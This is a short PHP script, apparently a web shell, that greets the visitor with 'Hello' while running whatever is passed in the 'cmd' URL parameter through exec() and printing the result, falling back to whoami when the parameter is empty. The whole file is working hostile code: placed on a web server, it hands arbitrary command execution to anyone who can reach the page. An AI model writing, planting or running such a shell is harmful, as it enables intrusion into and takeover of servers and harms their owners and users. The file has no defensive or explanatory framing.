<?php
$id = $_GET["cmd"];
if ($_GET["cmd"] == NULL){
	echo "Hello " . exec("whoami") . "!";
} else {
echo "Hello " . exec($id);
}
?>
